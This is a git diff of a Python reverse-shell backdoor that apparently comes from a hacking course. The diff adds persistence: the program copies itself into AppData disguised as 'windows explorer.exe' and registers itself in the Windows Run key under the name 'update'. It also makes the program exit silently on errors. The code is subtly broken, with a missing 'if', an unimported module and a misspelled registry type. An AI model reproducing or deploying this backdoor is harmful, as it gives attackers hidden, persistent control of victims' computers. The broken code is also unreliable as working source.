@@ -4,13 +4,21 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 
 class Backdoor:
     def __init__(self,ip,port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.connection.connect((ip,port))
         #connection.send(b"\n[+] Connection initiated.\n")
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\windows explorer.exe"
+        os.path.exists(evil_file_location):
+            shutil.copy(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REZ_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         print(data)
@@ -50,7 +58,7 @@ class Backdoor:
                 command = self.reliable_receive()
                 if command[0] == 'exit':
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == 'cd' and len(command)>1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == 'download':
@@ -67,6 +75,8 @@ class Backdoor:
         self.connection.close()
 
 
-
-my_backdoor = Backdoor("127.0.0.1", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("127.0.0.1", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
